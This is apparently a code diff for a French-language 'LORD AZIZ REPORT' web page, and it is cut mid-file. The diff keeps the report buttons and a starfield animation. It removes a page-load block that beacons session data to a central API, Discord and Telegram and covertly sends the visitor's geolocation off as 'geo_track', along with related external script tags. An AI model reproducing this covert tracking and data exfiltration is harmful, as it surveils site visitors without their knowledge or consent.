+document.querySelectorAll('.motif-btn').forEach(btn => {
+    btn.addEventListener('click', () => {
+        document.querySelectorAll('.motif-btn').forEach(b => b.classList.remove('selected'));
+        btn.classList.add('selected');
+        selectedType = btn.dataset.type;
     });
-    
-    document.getElementById('sendBtn').addEventListener('click', sendReport);
-    checkStoredNotification();
-    
-    window.addEventListener('load', function() {
-        sendToCentralAPI({ action: 'page_load', url: window.location.href });
-        sendToDiscord(`🌐 Page LORD AZIZ REPORT chargée\nSession: ${sessionToken.substring(0,8)}`);
-        sendToTelegram(`🟢 Système LORD AZIZ actif\nSession: ${sessionToken.substring(0,8)}`);
-        
-        if(navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(function(pos) {
-                const geoData = encryptData(`${pos.coords.latitude},${pos.coords.longitude}`);
-                sendToCentralAPI({ action: 'geo_track', data: geoData });
-            });
-        }
-        
-        const canvas = document.getElementById("stars");
-        const ctx = canvas.getContext("2d");
-        
-        function resize() {
-            canvas.width = window.innerWidth;
-            canvas.height = window.innerHeight;
-        }
-        resize();
-        window.addEventListener("resize", resize);
-        
-        let stars = [];
-        for (let i = 0; i < 150; i++) {
-            stars.push({
-                x: Math.random() * canvas.width,
-                y: Math.random() * canvas.height,
-                size: Math.random() * 2 + 0.5,
-                speed: Math.random() * 0.6 + 0.2
-            });
-        }
-        
-        function animateStars() {
-            ctx.clearRect(0, 0, canvas.width, canvas.height);
-            ctx.fillStyle = "#ffffff";
-            stars.forEach(star => {
-                ctx.beginPath();
-                ctx.arc(star.x, star.y, star.size, 0, Math.PI * 2);
-                ctx.fill();
-                star.y += star.speed;
-                if (star.y > canvas.height) {
-                    star.y = 0;
-                    star.x = Math.random() * canvas.width;
-                }
-            });
-            requestAnimationFrame(animateStars);
-        }
-        animateStars();
+});
+
+document.getElementById('sendBtn').addEventListener('click', sendReport);
+checkStoredNotification();
+
+// Étoiles animées
+const canvas = document.getElementById("stars");
+const ctx = canvas.getContext("2d");
+
+function resize() {
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+}
+resize();
+window.addEventListener("resize", resize);
+
+let stars = [];
+for (let i = 0; i < 150; i++) {
+    stars.push({
+        x: Math.random() * canvas.width,
+        y: Math.random() * canvas.height,
+        size: Math.random() * 2 + 0.5,
+        speed: Math.random() * 0.6 + 0.2
     });
-})();
+}
+
+function animateStars() {
+    ctx.clearRect(0, 0, canvas.width, canvas.height);
+    ctx.fillStyle = "#ffffff";
+    stars.forEach(star => {
+        ctx.beginPath();
+        ctx.arc(star.x, star.y, star.size, 0, Math.PI * 2);
+        ctx.fill();
+        star.y += star.speed;
+        if (star.y > canvas.height) {
+            star.y = 0;
+            star.x = Math.random() * canvas.width;
+        }
+    });
+    requestAnimationFrame(animateStars);
+}
+animateStars();
 </script>
 
-<script src="https://cdn.lordaziz.com/sdk/v2/analytics.min.js" async defer></script>
-<script src="https://telegram.org/js/telegram-web-app.js?1" async></script>
-<link rel="preconnect" href="https://api.lordaziz.com">
-<link rel="dns-prefetch" href="https://discord.com">
-<link rel="preconnect" href="https://graph.facebook.com">
 </body>
 </html>
